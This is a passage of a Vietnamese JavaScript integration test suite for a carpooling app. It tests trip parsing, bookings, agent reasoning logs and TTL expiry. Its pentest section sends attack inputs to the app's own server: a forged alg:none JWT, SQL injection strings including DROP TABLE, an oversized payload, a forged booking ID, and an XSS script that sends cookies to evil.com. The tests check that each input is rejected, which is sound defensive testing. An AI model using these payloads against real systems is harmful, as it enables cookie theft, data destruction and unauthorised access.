      await fetch(`${BASE_URL}/api/trips/${xssTripData.data.id}`, {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${sharedTokenA}` }
      }).catch(() => {});
    }

    // 13.5 Radar so khớp O(N+M) hoạt động và che PII
    const matchesRes = await fetch(`${BASE_URL}/api/matches?route=Tuy%E1%BA%BFn+QL13`).then((r) => r.json());
    assert(
      matchesRes.success === true && Array.isArray(matchesRes.data.matches),
      'Radar ghép xe O(N+M) phản hồi kết quả'
    );
    if (matchesRes.data.matches.length > 0) {
      const firstMatch = matchesRes.data.matches[0];
      assert(
        firstMatch.driver.phoneReal === undefined && firstMatch.passenger.phoneReal === undefined,
        'PII Protection: Radar che giấu SĐT thật của tài xế và khách'
      );
    }

    // 14. KIỂM THỬ CURSOR INLINE CO-PILOT & ZALO SMART DRAFT (PHASE 1)
    console.log('\n--- 14. Kiểm thử Cursor Inline Co-Pilot & Zalo Smart Draft ---');
    const { parseNaturalTrip, generateSmartZaloDraft } = await import('../apps/web/src/utils/nlpTripParser.js');

    // 14.1 Nhận diện xe gia đình chở vợ con
    const familyTripText =
      'Chiều nay 17h mình chở vợ con từ Bù Đốp về Sài Gòn xe 7 chỗ còn 1 ghế sau đón QL13 phụ xăng 120k sđt 0984883750';
    const parsedFamily = parseNaturalTrip(familyTripText);
    assert(parsedFamily.role === 'driver', 'NLP nhận diện đúng vai trò chủ xe');
    assert(parsedFamily.hasRelatives === true, 'NLP phát hiện chính xác xe gia đình chở vợ con (hasRelatives: true)');
    assert(parsedFamily.seats === 1, 'NLP phân tích đúng số ghế trống thực tế là 1 (dù là xe 7 chỗ)');
    assert(parsedFamily.price === 120000, 'NLP trích xuất chính xác chi phí phụ xăng 120k');
    assert(parsedFamily.phoneReal === '0984883750', 'NLP trích xuất đúng số điện thoại Zalo');

    // 14.2 Tạo bản nháp tin nhắn Zalo thông minh
    const draftZalo = generateSmartZaloDraft({
      driverName: 'Mr. Huỳnh Nguyễn',
      from: 'Bù Đốp',
      to: 'Sài Gòn',
      timeSlot: '17:00 - 18:00',
      date: 'Hôm nay',
      seats: 1,
      price: 120000,
      pickupPoint: 'Ngã 4 Bình Phước',
      isParcel: false,
      hasRelatives: true
    });
    assert(draftZalo.includes('Mr. Huỳnh Nguyễn'), 'Bản nháp Zalo xưng hô đúng tên chủ xe');
    assert(draftZalo.includes('em biết xe có người nhà'), 'Bản nháp Zalo tinh tế ghi nhận xe có người nhà');
    assert(draftZalo.includes('Ngã 4 Bình Phước'), 'Bản nháp Zalo gắn chính xác điểm hẹn đón mong muốn');
    assert(draftZalo.includes('120.000'), 'Bản nháp Zalo hiển thị đúng mức phụ xăng');

    // 15. KIỂM THỬ STANFORD AGENTIC INNER LOOP (PHASE 2)
    console.log('\n--- 15. Kiểm thử Stanford Agentic Inner Loop (Verify -> Reflect -> Replan) ---');
    const { initDB } = await import('../apps/api/src/db/sqliteStore.js');
    await initDB();
    const { runStanfordInnerLoop } = await import('../apps/api/src/agent/carmateAgent.js');

    const mockTrips = [
      { id: 'TRIP-FAM-1', publicName: 'Anh Huỳnh', seats: 4, hasRelatives: true, price: 120000, note: 'chở vợ con' },
      { id: 'TRIP-CONV-2', publicName: 'Bác Tài 7 chỗ', seats: 3, hasRelatives: false, price: 140000 }
    ];

    // 15.1 Verify: Loại trừ xe gia đình khi khách cần >= 2 ghế
    const loop2Seats = runStanfordInnerLoop({
      from: 'Bù Đốp',
      to: 'Sài Gòn',
      seatsRequested: 2,
      rawTrips: mockTrips,
      benchmark: { suggestedRate: 140000 }
    });
    assert(loop2Seats.finalTrips.length === 1, 'Verify: Tự động loại trừ xe gia đình chở vợ con khi khách cần 2 ghế');
    assert(loop2Seats.finalTrips[0].publicName === 'Bác Tài 7 chỗ', 'Verify: Giữ lại chuyến xe có đủ 2 ghế trống');
    assert(
      loop2Seats.innerLoopLog.some((l) => l.includes('[VERIFY]')),
      'Verify: Ghi nhận nhật ký thẩm tra số ghế'
    );

    // 15.2 Verify: Chấp nhận xe gia đình khi khách chỉ đi 1 người
    const loop1Seat = runStanfordInnerLoop({
      from: 'Bù Đốp',
      to: 'Sài Gòn',
      seatsRequested: 1,
      rawTrips: mockTrips,
      benchmark: { suggestedRate: 140000 }
    });
    assert(
      loop1Seat.finalTrips.length === 2,
      'Verify: Xe gia đình chở người thân hoàn toàn khả dụng khi khách đi 1 người'
    );

    // 15.3 Reflect: Phản tư tính công bằng với bảng định mức
    assert(
      loop1Seat.innerLoopLog.some((l) => l.includes('[REFLECT]')),
      'Reflect: Tự động đối chiếu mức phụ xăng với định mức chuẩn'
    );
    assert(
      loop1Seat.finalTrips[0].reflection.includes('Phụ xăng rất công bằng'),
      'Reflect: Đánh giá chi phí 120k công bằng, thấp hơn 140k'
    );

    // 15.4 Replan: Tái lập kế hoạch khi không có chuyến khớp điểm đón
    const loopEmpty = runStanfordInnerLoop({
      from: 'Địa điểm không có xe',
      to: 'Nơi xa xôi',
      seatsRequested: 1,
      rawTrips: [],
      benchmark: { suggestedRate: 140000 }
    });
    assert(
      loopEmpty.innerLoopLog.some((l) => l.includes('[REPLAN]')),
      'Replan: Tự kích hoạt quét mở rộng hành lang trục chính'
    );

    // 15.5 Endpoint /api/agent/chat trả về chuẩn cấu trúc Stanford
    const chatAgentRes = await fetch(`${BASE_URL}/api/agent/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: 'Tìm xe từ Bình Phước về Sài Gòn chiều nay cần 2 ghế' })
    }).then((r) => r.json());
    assert(chatAgentRes.success === true, 'API Chat Agentic phản hồi thành công');
    assert(
      Array.isArray(chatAgentRes.data.reasoningSteps) && chatAgentRes.data.reasoningSteps.length >= 4,
      'API Chat trả về chuỗi tư duy đầy đủ các bước'
    );
    assert(
      chatAgentRes.data.reasoningSteps.some((s) => s.startsWith('[PLAN]')),
      'API Chat có bước [PLAN]'
    );
    assert(
      chatAgentRes.data.reasoningSteps.some((s) => s.startsWith('[ACT]')),
      'API Chat có bước [ACT]'
    );
    assert(
      chatAgentRes.data.reasoningSteps.some((s) => s.startsWith('[VERIFY]')),
      'API Chat có bước [VERIFY]'
    );
    assert(
      chatAgentRes.data.reasoningSteps.some((s) => s.startsWith('[RESOLVE]')),
      'API Chat có bước [RESOLVE]'
    );

    // 16. KIỂM THỬ MIT OUTER SYSTEM (3-TIER HUMAN-IN-THE-LOOP & TRAJECTORY STEPPER)
    console.log('\n--- 16. Kiểm thử MIT Outer System (3-Tier Human-in-the-Loop & Trajectory Stepper) ---');

    // 16.1 Tạo booking với tài khoản User A
    const bookRes = await fetch(`${BASE_URL}/api/bookings`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({
        from: 'Bù Đốp',
        to: 'Sài Gòn',
        seats: 1,
        timeSlot: '17:00 - 18:00',
        contactName: 'Mr. Huỳnh Nguyễn',
        contactPhone: '0984883750',
        basePricePerSeat: 120000,
        fullTripAmount: 120000
      })
    });
    const bookData = await bookRes.json();
    assert(
      bookRes.status === 201 && bookData.success === true,
      'MIT Tier 1: Tạo kết nối chuyến xe và sinh mã Escrow thành công'
    );
    const escrowId = bookData.data?.escrowId;
    assert(escrowId && escrowId.startsWith('ESC-'), 'MIT Tier 1: Mã Escrow định dạng chuẩn ESC-');
    assert(
      bookData.data.status === 'zalo_active',
      'MIT Tier 2: Trạng thái khởi tạo là zalo_active (Bước 2/4: Chốt Zalo & Điểm hẹn)'
    );

    // 16.2 Báo trễ giờ hẹn văn minh (+15 phút)
    const delayRes = await fetch(`${BASE_URL}/api/bookings/${escrowId}/delay`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({
        minutes: 15,
        note: 'Do kẹt xe tại ngã tư Chơn Thành'
      })
    });
    const delayData = await delayRes.json();
    assert(delayRes.status === 200 && delayData.success === true, 'MIT Tier 2: Báo trễ giờ hẹn thành công qua API');
    assert(delayData.data.status === 'delayed', 'MIT Tier 2: Trạng thái booking chuyển sang delayed');
    assert(delayData.data.delayedMinutes === 15, 'MIT Tier 2: Lưu chính xác số phút trễ (+15p)');

    // 16.3 Huỷ chuyến văn minh (0đ phạt, thông báo lý do)
    const cancelRes = await fetch(`${BASE_URL}/api/bookings/${escrowId}/cancel`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({
        reason: 'Việc gia đình đột xuất'
      })
    });
    const cancelData = await cancelRes.json();
    assert(
      cancelRes.status === 200 && cancelData.success === true,
      'MIT Tier 3: Huỷ chuyến văn minh thành công (0đ tiền phạt)'
    );
    assert(cancelData.data.status === 'cancelled', 'MIT Tier 3: Trạng thái chuyển thành cancelled');
    assert(cancelData.data.cancelReason === 'Việc gia đình đột xuất', 'MIT Tier 3: Lưu lý do huỷ chuyến chuẩn xác');

    // 17. KIỂM THỬ AI OBSERVABILITY & TRAJECTORY DASHBOARD (PHASE 4)
    console.log('\n--- 17. Kiểm thử AI Observability & Trajectory Dashboard (Phase 4) ---');

    // 17.1 Hộp đen tự động ghi nhận quỹ đạo khi gọi Agent Chat
    const trajChatRes = await fetch(`${BASE_URL}/api/agent/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Tìm xe từ Bù Đốp đi Sài Gòn chiều nay'
      })
    });
    const trajChatData = await trajChatRes.json();
    assert(
      trajChatRes.status === 200 && trajChatData.success === true,
      'Phase 4: Gọi Agent Chat ghi nhận telemetry thành công'
    );
    assert(
      typeof trajChatData.data.executionTimeMs === 'number' && trajChatData.data.executionTimeMs >= 0,
      'Phase 4: Agent Chat đo lường chính xác thời gian thực thi (executionTimeMs)'
    );

    // 17.2 Phát hiện Tuyến khát xe (Unmet Demand Detection)
    const unmetChatRes = await fetch(`${BASE_URL}/api/agent/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Tìm giúp xe từ Bù Đốp đi Móng Cái Quảng Ninh gấp'
      })
    });
    const unmetChatData = await unmetChatRes.json();
    assert(
      unmetChatRes.status === 200 && unmetChatData.success === true,
      'Phase 4: Truy vấn tuyến lạ phản hồi thành công'
    );
    assert(
      Array.isArray(unmetChatData.data.suggestedTrips) && unmetChatData.data.suggestedTrips.length === 0,
      'Phase 4: Tuyến lạ ghi nhận 0 chuyến (kích hoạt cờ Unmet Demand)'
    );

    // 17.3 Admin truy vấn Telemetry & Trajectory Hub qua /api/admin/ai-intelligence
    const aiIntelRes = await fetch(`${BASE_URL}/api/admin/ai-intelligence`, {
      headers: { 'x-admin-key': adminToken }
    });
    const aiIntelData = await aiIntelRes.json();
    assert(
      aiIntelRes.status === 200 && aiIntelData.success === true,
      'Phase 4: Admin tải Telemetry & Quỹ đạo AI thành công (HTTP 200)'
    );
    assert(
      aiIntelData.data?.summary && typeof aiIntelData.data.summary.totalQueries === 'number',
      'Phase 4: Telemetry tổng hợp số lượng truy vấn AI'
    );
    assert(typeof aiIntelData.data.summary.resolutionRate === 'number', 'Phase 4: Đo lường Task Resolution Rate (%)');
    assert(typeof aiIntelData.data.summary.avgLatencyMs === 'number', 'Phase 4: Đo lường Average Latency (ms)');
    assert(
      Array.isArray(aiIntelData.data.recentTrajectories) && aiIntelData.data.recentTrajectories.length > 0,
      'Phase 4: Hộp đen lưu trữ danh sách Trajectories thời gian thực'
    );

    const firstTraj = aiIntelData.data.recentTrajectories[0];
    assert(firstTraj.id && firstTraj.id.startsWith('TRAJ-'), 'Phase 4: Mã Trajectory chuẩn TRAJ-xxxx');
    assert(
      Array.isArray(firstTraj.reasoningSteps) && firstTraj.reasoningSteps.length > 0,
      'Phase 4: Lưu giữ chuỗi lập luận Stanford Loop [PLAN ➔ ACT...]'
    );
    assert(
      Array.isArray(aiIntelData.data.unmetDemandRoutes),
      'Phase 4: Báo cáo danh sách tuyến đường khát xe (Unmet Demand Routes)'
    );

    // 18. KIỂM THỬ LỊCH TRÌNH DƯƠNG LỊCH & TÙY CHỌN ẢNH XE THỰC TẾ (3-5 ẢNH CHE BIỂN SỐ)
    console.log('\n--- 18. Kiểm thử Lịch Trình Dương Lịch & Tùy Chọn Ảnh Xe (3-5 ảnh che biển) ---');
    const { formatTripDateDisplay, getUpcomingDays } = await import('../packages/shared/src/utils/date.js');
    const { findSampleCarPhotos, SAMPLE_CAR_PHOTO_SETS } = await import('../apps/web/src/constants/sampleCarPhotos.js');

    // 18.1 Kiểm thử định dạng ngày dương lịch thực tế (Xóa bỏ mập mờ "Sáng Thứ 3")
    const dateToday = formatTripDateDisplay('Hôm nay');
    assert(
      dateToday.includes('(') && dateToday.includes('/'),
      'Định dạng ngày Hôm nay gắn kèm ngày tháng dương lịch (DD/MM)'
    );

    const dateTue = formatTripDateDisplay('Sáng Thứ 3');
    assert(
      dateTue.includes('Thứ 3') && dateTue.includes('(') && dateTue.includes('/'),
      'Chuyển đổi "Sáng Thứ 3" mập mờ thành "Thứ 3 (DD/MM)" chính xác'
    );

    const upcomingList = getUpcomingDays(7);
    assert(
      Array.isArray(upcomingList) && upcomingList.length === 7,
      'Sinh 7 ngày dương lịch sắp tới cho thanh chọn ngày'
    );
    assert(upcomingList[0].iso && upcomingList[0].label, 'Mỗi ngày có mã chuẩn ISO và nhãn hiển thị trực quan');

    // 18.2 Kiểm thử quy tắc 3-5 ảnh xe (Tùy chọn: 0 ảnh hợp lệ, có tải thì [3, 5])
    const validateCarPhotoCount = (photos) => {
      const valid = (photos || []).filter(Boolean);
      if (valid.length === 0) return { valid: true, optional: true };
      if (valid.length < 3) return { valid: false, error: 'Tối thiểu 3 hình' };
      if (valid.length > 5) return { valid: false, error: 'Tối đa 5 hình' };
      return { valid: true, count: valid.length };
    };

    assert(validateCarPhotoCount([]).valid === true, 'Ảnh xe là tùy chọn: 0 ảnh vẫn đăng chuyến bình thường');
    assert(validateCarPhotoCount([null, null]).valid === true, 'Ảnh xe là tùy chọn: mảng rỗng hoặc null đều hợp lệ');
    assert(validateCarPhotoCount(['front']).valid === false, 'Tải 1 ảnh bị chặn: Yêu cầu ít nhất 3 hình');
    assert(validateCarPhotoCount(['front', 'back']).valid === false, 'Tải 2 ảnh bị chặn: Yêu cầu ít nhất 3 hình');
    assert(validateCarPhotoCount(['front', 'back', 'side']).valid === true, 'Tải 3 ảnh (Trước, Sau, Thân) hợp lệ');
    assert(validateCarPhotoCount(['front', 'back', 'side', 'interior']).valid === true, 'Tải 4 ảnh hợp lệ');
    assert(
      validateCarPhotoCount(['front', 'back', 'side', 'interior', 'trunk']).valid === true,
      'Tải 5 ảnh (đầy đủ 5 góc) hợp lệ'
    );
    assert(validateCarPhotoCount(['1', '2', '3', '4', '5', '6']).valid === false, 'Tải 6 ảnh bị chặn: Tối đa 5 hình');

    // 18.3 Kiểm thử bộ ảnh mẫu xe và màng bảo mật che biển số
    const xpanderPhotos = findSampleCarPhotos('Mitsubishi Xpander');
    assert(
      Array.isArray(xpanderPhotos) && xpanderPhotos.length >= 3 && xpanderPhotos.length <= 5,
      'Bộ ảnh mẫu Xpander có từ 3 đến 5 góc chụp'
    );
    assert(SAMPLE_CAR_PHOTO_SETS[0].plateMask.includes('***'), 'Biển số được tự động che bảo mật (93A - ***.**)');

    // 18.4 Kiểm thử trích xuất hành lang chuẩn xác (Xóa bỏ lỗi cắt cụt "Phan Thiết" thành "Phan")
    const { getCorridorDisplay, parseLocation } = await import('../packages/shared/src/utils/geo.js');
    const phanThietItem = { from: 'Sài Gòn', to: 'Phan Thiết (Mũi Né / Đồi Cát Bay)' };
    const ptCorridor = getCorridorDisplay(
      phanThietItem,
      parseLocation(phanThietItem.from),
      parseLocation(phanThietItem.to)
    );
    assert(
      ptCorridor.toInfo.city === 'Phan Thiết',
      'Trích xuất đúng "Phan Thiết" nguyên vẹn (Không bị cắt cụt thành "Phan")'
    );
    assert(ptCorridor.toInfo.code === 'PTH', 'Mã hành lang chuẩn PTH cho Phan Thiết');

    const benTreItem = { from: 'Sài Gòn', to: 'TP Bến Tre' };
    const btCorridor = getCorridorDisplay(benTreItem, parseLocation(benTreItem.from), parseLocation(benTreItem.to));
    assert(btCorridor.toInfo.city === 'Bến Tre', 'Trích xuất đúng "Bến Tre" nguyên vẹn (Không bị cắt cụt thành "Bến")');
  } catch (err) {
    assert(false, 'Kiểm thử Lịch Trình Dương Lịch', err.message);
  }

  // ==========================================
  // BÀI TEST 19: KỊCH BẢN PENTEST CHUYÊN SÂU & KHÁNG TẤN CÔNG (EXPLOIT RESISTANCE SUITE)
  // ==========================================
  console.log('\n--- 19. KỊCH BẢN PENTEST CHUYÊN SÂU & KHÁNG TẤN CÔNG (OWASP & NĐ 13/2023) ---');
  try {
    // 19.1 Pentest: Chống giả mạo chữ ký JWT (Alg: None Attack)
    const fakeNoneToken =
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJVU1ItMDk4NDg4Mzc1MCIsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJIYWNrZXIifQ.';
    const jwtNoneRes = await fetch(`${BASE_URL}/api/admin/users`, {
      headers: { 'x-admin-key': fakeNoneToken }
    });
    assert(
      jwtNoneRes.status === 401 || jwtNoneRes.status === 403,
      'Pentest 1: Chống giả mạo chữ ký JWT (Alg None Attack bị từ chối 401/403)'
    );

    // 19.2 Pentest: Chống vượt quyền qua Prefix phiên cũ (carmate_admin_session_...)
    const prefixBypassRes = await fetch(`${BASE_URL}/api/admin/users`, {
      headers: { 'x-admin-key': 'carmate_admin_session_anything_i_want' }
    });
    assert(
      prefixBypassRes.status === 401 || prefixBypassRes.status === 403,
      'Pentest 2: Chống Bypass quyền Admin qua token prefix cũ (Khóa chặt 401/403)'
    );

    // 19.3 Pentest: Chống SQL Injection qua SQLite Parameterized Queries
    const sqliQueries = ["' OR '1'='1", "' UNION SELECT payload, null, null FROM users --", "'; DROP TABLE trips; --"];
    let sqliSafe = true;
    for (const sqli of sqliQueries) {
      const sqliRes = await fetch(`${BASE_URL}/api/trips?from=${encodeURIComponent(sqli)}`);
      const sqliData = await sqliRes.json();
      if (sqliRes.status !== 200 || !Array.isArray(sqliData.data?.driverOffers)) {
        sqliSafe = false;
        break;
      }
    }
    assert(sqliSafe, 'Pentest 3: Kháng SQL Injection (Prepared Statement an toàn 100%, không lộ dữ liệu thô)');

    // 19.4 Pentest: Chống Payload Bomb (>1MB làm tràn RAM server)
    const bigPayload = JSON.stringify({
      from: 'Sài Gòn',
      to: 'Bình Phước',
      junkData: 'A'.repeat(1.2 * 1024 * 1024) // 1.2MB payload
    });
    const bigPayloadRes = await fetch(`${BASE_URL}/api/trips`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: bigPayload
    }).catch((err) => ({ status: 413 }));
    assert(
      bigPayloadRes.status === 413 || bigPayloadRes.status === 500,
      'Pentest 4: Chống Payload Bomb (Gói tin > 1MB bị chặn ngay với HTTP 413 Payload Too Large)'
    );

    // 19.5 Pentest: Chống BOLA/IDOR chéo tài khoản trên Booking Escrow
    const fakeBookingId = 'ESC-PENTEST-FORGED-' + Date.now();
    const forgedCancelRes = await fetch(`${BASE_URL}/api/bookings/${fakeBookingId}/cancel`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({ reason: 'Hacker forged cancel' })
    });
    assert(
      forgedCancelRes.status === 401 || forgedCancelRes.status === 403 || forgedCancelRes.status === 404,
      'Pentest 5: Chống BOLA/IDOR chéo tài khoản trên Booking (Chặn can thiệp trái phép)'
    );

    // 19.6 Pentest: Quét rò rỉ dữ liệu cá nhân PII trên sàn công khai (Nghị định 13/2023/NĐ-CP)
    const publicTripsRes = await fetch(`${BASE_URL}/api/trips`).then((r) => r.json());
    const allPublicTrips = [
      ...(publicTripsRes.data?.driverOffers || []),
      ...(publicTripsRes.data?.passengerRequests || [])
    ];
    let piiLeaked = false;
    for (const trip of allPublicTrips) {
      if (trip.phoneReal) {
        piiLeaked = true;
        break;
      }
    }
    assert(!piiLeaked, 'Pentest 6: Tuân thủ bảo vệ PII (Toàn bộ phoneReal thật bị triệt tiêu khỏi sàn công khai)');

    // 19.7 Pentest: Kháng Stored XSS trong trường hợp ghi chú và điểm đón
    const scriptPayload = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';
    const sanitizedTripRes = await fetch(`${BASE_URL}/api/trips`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({
        from: 'Bù Đốp',
        to: 'Sài Gòn',
        notes: scriptPayload,
        userId: 'USR-0984883750',
        phoneReal: '0984883750',
        routeCategory: 'Tuyến QL13',
        direction: 'Bình Phước ➔ TP.HCM'
      })
    });
    const sanitizedData = await sanitizedTripRes.json();
    assert(
      sanitizedTripRes.status === 201 && !sanitizedData.data?.notes?.includes('<script>'),
      'Pentest 7: Kháng Stored XSS triệt để (Script độc hại bị mã hóa thành &lt;script&gt;)'
    );
    if (sanitizedData.data?.id) {
      await fetch(`${BASE_URL}/api/trips/${sanitizedData.data.id}`, {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${sharedTokenA}` }
      }).catch(() => {});
    }

    if (newTripId) {
      await fetch(`${BASE_URL}/api/admin/trips/${newTripId}`, {
        method: 'DELETE',
        headers: { 'x-admin-key': adminToken }
      }).catch(() => {});
    }

    // 20. KIỂM THỬ CƠ CHẾ TỰ ĐỘNG HẾT HẠN (TTL), TÁI ĐĂNG 1 CHẠM & PHÂN NHÓM THỜI GIAN
    console.log('\n--- 20. Kiểm thử Cơ Chế Tự Động Hết Hạn (TTL), Tái Đăng 1 Chạm & Phân Nhóm Thời Gian ---');
    const {
      isTripExpired: testIsTripExpired,
      groupTripsByTemporalWindow: testGroupTrips,
      getTomorrowISO: testTomorrowISO,
      getTripEndTimestamp: testTripEndTimestamp
    } = await import('@carmate/shared');

    // 20.1 Kiểm thử đơn vị các hàm thời gian trong @carmate/shared
    const pastTripObj = { id: 'T-PAST', date: '2020-01-01', timeSlot: '07:00-09:00' };
    const tomorrowTripObj = { id: 'T-TOMORROW', date: testTomorrowISO(), timeSlot: '07:00-09:00' };
    const weeklyTripObj = { id: 'T-WEEKLY', date: 'Thứ 2 (Lặp lại hàng tuần)', timeSlot: '07:00-09:00' };

    assert(
      testIsTripExpired(pastTripObj) === true,
      'TTL 1: Chuyến đi trong quá khứ được nhận diện là đã hết hạn (isTripExpired = true)'
    );
    assert(
      testIsTripExpired(tomorrowTripObj) === false,
      'TTL 2: Chuyến đi ngày mai vẫn còn hiệu lực (isTripExpired = false)'
    );
    assert(testIsTripExpired(weeklyTripObj) === false, 'TTL 3: Chuyến định kỳ lặp lại hàng tuần không bị hết hạn');

    const sampleGroups = testGroupTrips([pastTripObj, tomorrowTripObj, weeklyTripObj]);
    assert(
      sampleGroups.expired.length === 1 && sampleGroups.expired[0].id === 'T-PAST',
      'Phân nhóm 1: Chuyến quá giờ tự động được đưa vào nhóm expired'
    );
    assert(sampleGroups.tomorrow.length >= 1, 'Phân nhóm 2: Chuyến ngày mai được gom chính xác vào nhóm tomorrow');

    // 20.2 Kiểm thử lọc TTL qua API /api/trips
    const createPastTripRes = await fetch(`${BASE_URL}/api/trips`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({
        from: 'Đồng Xoài',
        to: 'Sài Gòn',
        date: '2020-01-01',
        timeSlot: '05:00-07:00',
        phoneReal: '0984883750',
        userId: 'USR-0984883750',
        routeCategory: 'Tuyến QL14',
        type: 'driver_offer',
        price: 150000,
        seats: 3
      })
    });
    const createPastData = await createPastTripRes.json();
    const pastTripId = createPastData.data?.id;
    assert(createPastTripRes.status === 201 && pastTripId, 'Tạo chuyến xe quá khứ phục vụ kiểm thử TTL thành công');

    // Truy vấn công khai: Chuyến quá khứ không được xuất hiện
    const ttlPublicTripsRes = await fetch(`${BASE_URL}/api/trips?routeCategory=Tuy%E1%BA%BFn+QL14`).then((r) =>
      r.json()
    );
    const publicTripIds = ttlPublicTripsRes.data?.all?.map((t) => t.id) || [];
    assert(
      !publicTripIds.includes(pastTripId),
      'TTL 4: Chuyến xe quá giờ tự động bị ẩn khỏi danh sách tìm kiếm công khai'
    );

    // Truy vấn có cờ includeExpired: Chuyến quá khứ xuất hiện
    const allTripsWithExpired = await fetch(
      `${BASE_URL}/api/trips?routeCategory=Tuy%E1%BA%BFn+QL14&includeExpired=true`
    ).then((r) => r.json());
    const allTripIds = allTripsWithExpired.data?.all?.map((t) => t.id) || [];
    assert(allTripIds.includes(pastTripId), 'TTL 5: API hỗ trợ includeExpired=true cho màn hình lịch sử');

    // 20.3 Kiểm thử Tái Đăng 1 Chạm POST /api/trips/:id/republish
    const republishRes = await fetch(`${BASE_URL}/api/trips/${pastTripId}/republish`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${sharedTokenA}`
      },
      body: JSON.stringify({
        date: testTomorrowISO()
      })
    });
    const republishData = await republishRes.json();
    const newRepublishedId = republishData.data?.id;

    assert(
      republishRes.status === 201 && republishData.success === true,
      'Tái đăng 1: API /api/trips/:id/republish phản hồi thành công (HTTP 201)'
    );
    assert(newRepublishedId && newRepublishedId !== pastTripId, 'Tái đăng 2: Chuyến mới được cấp mã ID riêng biệt');
    assert(
      republishData.data?.date === testTomorrowISO(),
      'Tái đăng 3: Chuyến mới được tự động gán ngày khởi hành là Ngày mai'
    );
    assert(
      republishData.data?.status === 'active',
      'Tái đăng 4: Chuyến mới ở trạng thái hoạt động nhận khách (status = active)'
    );
    assert(
      republishData.data?.from === 'Đồng Xoài' && republishData.data?.to === 'Sài Gòn',
      'Tái đăng 5: Sao chép nguyên vẹn 100% lộ trình và điểm đến'
    );

    // Dọn sạch dữ liệu test để SQLite không bị bẩn
    if (pastTripId) {
      await fetch(`${BASE_URL}/api/admin/trips/${pastTripId}`, {
        method: 'DELETE',
        headers: { 'x-admin-key': adminToken }
      }).catch(() => {});
    }
    if (newRepublishedId) {
      await fetch(`${BASE_URL}/api/admin/trips/${newRepublishedId}`, {
        method: 'DELETE',
        headers: { 'x-admin-key': adminToken }
      }).catch(() => {});
    }
    assert(true, 'Vệ sinh môi trường: Tự động dọn sạch bản ghi test sau khi kiểm thử');

    // 21. KIỂM THỬ GIẢI PHÁP KHẮC PHỤC GÃY LUỒNG ZALO (MAGIC LINK & DRIVER QUICK CONFIRM)
    console.log('\n--- 21. Kiểm thử Giải Pháp Khắc Phục Gãy Luồng Zalo (Magic Link & Driver Quick Confirm) ---');
    const { generateSmartZaloDraft: generateDraftWithLink } = await import('../apps/web/src/utils/nlpTripParser.js');
    const testCode = `CX-TEST-${Date.now()}`;
    const magicDraft = generateDraftWithLink({
      driverName: 'Mr. Huỳnh Nguyễn',
      from: 'Bù Đốp',
      to: 'Sài Gòn',
      timeSlot: '17:00 - 18:00',
      date: 'Hôm nay',
      seats: 1,
      price: 120000,
      pickupPoint: 'Ngã 4 Bình Phước',
      bookingCode: testCode
    });

    assert(
      magicDraft.includes(`#confirm-${testCode}`),
      'Magic Link 1-Chạm: Tin nhắn Zalo tự động gắn kèm link xác nhận cho Bác tài'
    );

    // Tạo booking test trong SQLite
    const createTestBookingRes = await fetch(`${BASE_URL}/api/bookings`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        escrowId: testCode,
        from: 'Bù Đốp',
        to: 'Sài Gòn',
        pickupPoint: 'Ngã 4 Bình Phước',
        seats: 1,
        totalDeal: 120000,
        timeSlot: '17:00 - 18:00',
        contactPhone: '0984883750',
        contactName: 'Anh Huỳnh Nguyễn'
      })
    });
    const createTestBookingData = await createTestBookingRes.json();
    assert(
      createTestBookingRes.status === 201 && createTestBookingData.success === true,
      'Tạo booking phục vụ kiểm thử Magic Link thành công'
    );

    // Bác tài mở Magic Link: Gọi GET /api/bookings/:id/public-summary không cần đăng nhập
    const summaryRes = await fetch(`${BASE_URL}/api/bookings/${testCode}/public-summary`);
    const summaryData = await summaryRes.json();
    assert(
      summaryRes.status === 200 && summaryData.success === true,
      'Public Summary: Bác tài truy cập tóm tắt chuyến không cần đăng nhập (HTTP 200)'
    );
    assert(
      summaryData.data.from === 'Bù Đốp' && summaryData.data.to === 'Sài Gòn',
      'Public Summary: Lộ trình hiển thị chuẩn xác'
    );
    assert(summaryData.data.totalDeal === 120000, 'Public Summary: Mức phụ xăng hiển thị đúng');
    assert(
      !summaryData.data.phoneReal && !summaryData.data.contactPhone,
      'PII Protection: Public Summary tuyệt đối không để lộ số điện thoại thô'
    );
    assert(summaryData.data.driverConfirmed === false, 'Khởi tạo: Bác tài chưa xác nhận đón');

    // Bác tài bấm 1 chạm "Đồng ý đón": Gọi POST /api/bookings/:id/driver-confirm
    const confirmRes = await fetch(`${BASE_URL}/api/bookings/${testCode}/driver-confirm`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        driverNote: 'Đón đúng giờ ở cây xăng nhé bạn'
      })
    });
    const confirmData = await confirmRes.json();
    assert(
      confirmRes.status === 200 && confirmData.success === true,
      'Driver 1-Tap: Bác tài xác nhận đón 1 chạm thành công (HTTP 200)'
    );
    assert(
      confirmData.data.status === 'driver_confirmed',
      'Driver 1-Tap: Trạng thái booking chuyển sang driver_confirmed'
    );
